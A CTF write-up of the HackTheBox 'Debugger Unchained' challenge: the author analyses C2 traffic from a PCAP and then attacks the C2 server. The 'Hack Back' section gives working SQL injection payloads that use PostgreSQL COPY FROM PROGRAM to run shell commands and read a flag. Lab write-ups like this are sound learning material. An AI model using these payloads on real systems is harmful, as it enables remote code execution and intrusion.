---
layout: post
title: HTB Business CTF 2022 Writeup - Debugger Unchained
date: 2022-07-17
type: post
tags:
- Writeup
- Hacking
- BusinessCTF
- CTF
permalink: /2022/07/HTBBusinessCTF/DebuggerUnchained
img: 2022/07/HTBBusinessCTF/DebuggerUnchained/DebuggerUnchained.png
---

In this challenge, we are given a PCAP file that contains the traffic between a compromised machine and the Command and Control (C2) server. We can then use the way the C2 communicates to compromise it back. 

> Our SOC team has discovered a new strain of malware in one of the workstations. They extracted what looked like a C2 profile from the infected machine's memory and exported a network capture of the C2 traffic for further analysis. To discover the culprits, we need you to study the C2 infrastructure and check for potential weaknesses that can get us access to the server.

## Inspecting The Traffic

The challenge provides a zip file that contains two files. The first one is a profile. 

```
{
    'sleeptime': 3000,
    'jitter': 5,
    'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337',
    'headers': {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'Cookie': '__cflb=$$UUID$$; __cfuid=$$RECV$$'
    },
    'get_uri': '/assets/jquery-3.6.0.slim.min.js',
    'set_uri': '/assets/jquery-3.6.0.slim.min.js'
}
```

The second one is a PCAP file that contains the traffic sent by a compromised machine to a C2 server. 

I opened the file in Wireshark and started by looking at HTTP traffic. 

![HTTP Traffic](/assets/images/2022/07/HTBBusinessCTF/DebuggerUnchained/HTTP.png "HTTP Traffic")

There is a suspicious number of downloads of jQuery. Even some POST to it. I inspected the requests by doing 'Follow HTTP Stream' on the first GET request. 

```http
GET /assets/jquery-3.6.0.slim.min.js HTTP/1.1
Host: cdnjs.cloudflair.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Accept-Language: en-US,en;q=0.5
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Cookie: __cflb=49f062b5-8b94-4fff-bb41-d504b148aa1b;
```

The request looked normal. The response was sending back something that looked like jQuery. Except at the very end. 

```
config="eyJzbGVlcHRpbWUiOiAzMDAwLCAiaml0dGVyIjogNSwgInVzZXJfYWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgWGJveDsgWGJveCBPbmUpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDMuMC4wLjAgU2FmYXJpLzUzNy4zNiBFZGdlLzQ0LjE4MzYzLjEzMzciLCAiaGVhZGVycyI6IHsiQWNjZXB0IjogIiovKiIsICJBY2NlcHQtTGFuZ3VhZ2UiOiAiZW4tVVMsZW47cT0wLjUiLCAiQWNjZXB0LUVuY29kaW5nIjogIiBnemlwLCBkZWZsYXRlIiwgIlNlYy1GZXRjaC1EZXN0IjogIiBlbXB0eSIsICJTZWMtRmV0Y2gtTW9kZSI6ICIgY29ycyIsICJTZWMtRmV0Y2gtU2l0ZSI6ICIgY3Jvc3Mtc2l0ZSIsICJDb29raWUiOiAiX19jZmxiPSQkVVVJRCQkOyBfX2NmdWlkPSQkUkVDViQkIn0sICJnZXRfdXJpIjogIi9hc3NldHMvanF1ZXJ5LTMuNi4wLnNsaW0ubWluLmpzIiwgInNldF91cmkiOiAiL2Fzc2V0cy9qcXVlcnktMy42LjAuc2xpbS5taW4uanMiLCAidXVpZCI6ICI0OWYwNjJiNS04Yjk0LTRmZmYtYmI0MS1kNTA0YjE0OGFhMWIifQ==";task="{'id': 18, 'cmd': 'd2hvYW1pIC9hbGw='}";
```

I used [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)) to decode the base64 values. 

The config contained a profile similar to the one provided with the challenge. 

```json
{"sleeptime": 3000, "jitter": 5, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337", "headers": {"Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": " gzip, deflate", "Sec-Fetch-Dest": " empty", "Sec-Fetch-Mode": " cors", "Sec-Fetch-Site": " cross-site", "Cookie": "__cflb=$$UUID$$; __cfuid=$$RECV$$"}, "get_uri": "/assets/jquery-3.6.0.slim.min.js", "set_uri": "/assets/jquery-3.6.0.slim.min.js", "uuid": "49f062b5-8b94-4fff-bb41-d504b148aa1b"}
```

The task cmd contained what looked like a command to execute on the compromised machine: `whoami /all`.

Next, I inspected a POST request. 

```http
POST /assets/jquery-3.6.0.slim.min.js HTTP/1.1
Host: cdnjs.cloudflair.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Accept-Language: en-US,en;q=0.5
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Cookie: __cflb=49f062b5-8b94-4fff-bb41-d504b148aa1b; __cfuid=eyJpZCI6IDE4LCAib3V0cHV0IjogIkNsVlRSVklnU1U1R1QxSk5RVlJKVDA0S0xTMHRMUzB0TFMwdExTMHRMUzB0TFFvS1ZYTmxjaUJPWVcxbElDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdVMGxFSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQW85UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFNBOVBUMDlQVDA5UFQwOVBUMDlQ...
Content-Length: 0
```

The machine was sending back a base64 encoded cookie. I decoded it, it contained some JSON. The output value was another base64 string. 

```json
{"id": 18, "output": "ClVTRVIgSU5GT1JNQVRJT04KLS0tLS0tLS0tLS0tLS0tLQoKVXNlciBOYW1lICAgICAgICAgICAgICAgICAgICAgU0lEICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PSA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CmRlc2t0b3AtcXYzbnFsbVxsYXJyeSBzdGV2ZW5zIFMtMS01LTIxLTIwMjkyNzgyMDgtMTg5OTI2MjUwNi0yNTMzOTg5NTA3LTEwMDAKCgpHUk9VUCBJTkZPUk1BVElPTgotLS0tLS0tLS0tLS0tLS0tLQoKR3JvdXAgTmFtZSAgICAgICAgICAg ..."}
```

I decoded that value. This contained the result of running the previous command. 

```

USER INFORMATION
----------------

User Name                     SID                                           
============================= ==============================================
desktop-qv3nqlm\larry stevens S-1-5-21-2029278208-1899262506-2533989507-1000


GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes                                        
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only                          
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only                          
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

I looked at the other requests. Most of them followed the same pattern. The machine would do a GET request to receive a command. Then use a POST request to send the result. 

There were two POST requests that were different. They caused errors on the C2. The first one sent a base64 string that did not contain valid JSON.

```http
POST /assets/jquery-3.6.0.slim.min.js HTTP/1.1
Host: cdnjs.cloudflair.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Accept-Language: en-US,en;q=0.5
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Cookie: __cflb=49f062b5-8b94-4fff-bb41-d504b148aa1b; __cfuid==
Content-Length: 0
```

It got back a Python error page with debugging information. 

```http
HTTP/1.1 500 INTERNAL SERVER ERROR
Server: Werkzeug/2.1.2 Python/3.8.13
Date: Fri, 24 Jun 2022 17:05:45 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 18647
Connection: close

<!doctype html>
<html lang=en>
  <head>
    <title>json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
 // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
    <link rel="shortcut icon"
        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    <script>
      var CONSOLE_MODE = false,
          EVALEX = false,
          EVALEX_TRUSTED = false,
          SECRET = "FmN3FSsiUpAt8sKOQU94";
    </script>
  </head>
  <body style="background-color: #fff">
    <div class="debugger">
<h1>JSONDecodeError</h1>
<div class="detail">
  <p class="errormsg">json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
</p>
</div>
<h2 class="traceback">Traceback <em>(most recent call last)</em></h2>
<div class="traceback">

...

<!--

Traceback (most recent call last):
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 2095, in __call__
    return self.wsgi_app(environ, start_response)
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 2080, in wsgi_app
    response = self.handle_exception(e)
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 2077, in wsgi_app
    response = self.full_dispatch_request()
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 1525, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 1523, in full_dispatch_request
    rv = self.dispatch_request()
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 1509, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
  File "/app/application/util.py", line 11, in wrap
    return f(*args, **kwargs)
  File "/app/application/blueprints/routes.py", line 55, in botRecv
    taskDATA = json.loads(rec_b64(unquote_plus(botDATA)))
  File "/usr/local/lib/python3.8/json/__init__.py", line 357, in loads
    return _default_decoder.decode(s)
  File "/usr/local/lib/python3.8/json/decoder.py", line 337, in decode
    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
  File "/usr/local/lib/python3.8/json/decoder.py", line 355, in raw_decode
    raise JSONDecodeError("Expecting value", s, err.value) from None
json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
-->
```

The next error was even more interesting. It sent a valid payload in the cookie. But it also got an error. This one was providing information about the backend. 

```http
HTTP/1.1 500 INTERNAL SERVER ERROR
Server: Werkzeug/2.1.2 Python/3.8.13
Date: Fri, 24 Jun 2022 17:05:45 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 18904
Connection: close

<!doctype html>
<html lang=en>
  <head>
    <title>psycopg2.errors.UniqueViolation: duplicate key value violates unique constraint "task_outputs_task_id_key"
DETAIL:  Key (task_id)=(20) already exists.

 // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
    <link rel="shortcut icon"
        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    <script>
      var CONSOLE_MODE = false,
          EVALEX = false,
          EVALEX_TRUSTED = false,
          SECRET = "FmN3FSsiUpAt8sKOQU94";
    </script>
  </head>
  <body style="background-color: #fff">
    <div class="debugger">
<h1>UniqueViolation</h1>
<div class="detail">
  <p class="errormsg">psycopg2.errors.UniqueViolation: duplicate key value violates unique constraint &quot;task_outputs_task_id_key&quot;
DETAIL:  Key (task_id)=(20) already exists.
...
```

## Hack Back

From that error, I knew that the backend was using a PostgreSQL database. And it was inserting the results of the commands in the database.

I immediately thought that it might be vulnerable to SQL Injection. I tried sending a single quote. 

```
{"id": "11", "output": "'"}
```

The response showed me that it was vulnerable.

```
psycopg2.errors.SyntaxError: unterminated quoted string at or near "''', 11)"
LINE 1: INSERT INTO task_outputs(output, task_id) VALUES (''', 11)
```

The problem I had was that the server did not return anything. I thought  about using the errors to perform a [blind injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection). But before I started coding, I looked for other solutions.

I knew that I could use PostgreSQL database to get [Remote Code Execution (RCE)](https://github.com/squid22/PostgreSQL_RCE/blob/main/postgresql_rce.py). I have used that technique in the past, and it works well. I tried using this to get a reverse shell, but it failed. 

This is when I thought about sending the result of my commands to the tasks table. Then I would be able to request a command from the C2 and see the output of my RCE. 

I experimented a bit, and came up with this request:

```
{"id": "11", "output": "', 23); DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'ls -la / | tr ''\n'' ''$'''; UPDATE tasks set cmd = cmd_output FROM cmd_exec; -- -"}
```

This would end up executing those five requests on the server.

```sql
-- Insert empty task result
INSERT INTO task_outputs(output, task_id) VALUES ('', 23);      

-- Make sure the table is not there
DROP TABLE IF EXISTS cmd_exec;

-- Create a table to contain the result of my command
CREATE TABLE cmd_exec(cmd_output text); 

-- Execute the command and store the result
COPY cmd_exec FROM PROGRAM 'ls -la / | tr ''\n'' ''$'''; 

-- Copy the result in the tasks table, the rest of the SQL is commented out
UPDATE tasks set cmd = cmd_output FROM cmd_exec; -- - ', 11)
```

When I requested the next command, I got the listing of the `/` folder. I had to replace the `\n` with `$` because it was only keeping the first line. 

```json
{"id": 1, "cmd": "total 96$drwxr-xr-x    1 root     root          4096 Jul 16 17:08 .$drwxr-xr-x    1 root     root          4096 Jul 16 17:08 ..$drwxr-xr-x    1 root     root          4096 Jul 13 13:50 app$drwxr-xr-x    1 root     root          4096 May 25 21:41 bin$drwxr-xr-x    5 root     root           360 Jul 16 17:08 dev$-rw-------    1 root     root           793 Jun 22 20:24 entrypoint.sh$drwxr-xr-x    1 root     root          4096 Jul 16 17:08 etc$drwxr-xr-x    1 root     root          4096 Jul 13 13:50 home$drwxr-xr-x    1 root     root          4096 Jul 13 13:49 lib$drwxr-xr-x    5 root     root          4096 May 23 16:51 media$drwxr-xr-x    2 root     root          4096 May 23 16:51 mnt$drwxr-xr-x    2 root     root          4096 May 23 16:51 opt$dr-xr-xr-x  268 root     root             0 Jul 16 17:08 proc$-rwsr-xr-x    1 root     root         18344 Jul 13 13:50 readflag$drwx------    1 root     root          4096 Jul 13 13:50 root$drwxr-xr-x    1 root     root          4096 Jul 16 17:08 run$drwxr-xr-x    2 root     root          4096 May 23 16:51 sbin$drwxr-xr-x    2 root     root          4096 May 23 16:51 srv$dr-xr-xr-x   13 root     root             0 Jul 16 17:08 sys$drwxrwxrwt    1 root     root          4096 Jul 16 17:08 tmp$drwxr-xr-x    1 root     root          4096 Jul 13 13:49 usr$drwxr-xr-x    1 root     root          4096 May 25 21:41 var$"}
```

There was one interesting file. 

```bash
rwsr-xr-x    1 root     root         18344 Jul 13 13:50 readflag
```

This was an executable, so I used the same technique to run it and get the output. 

```
{"id": "11", "output": "', 24); DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM '/readflag'; UPDATE tasks set cmd = cmd_output FROM cmd_exec; -- -"}
```

The result was the flag.
```
{"id": 1, "cmd": "HTB{c&c_h4ckb4ck_inj3ct3d_t0_rc3}"}
```
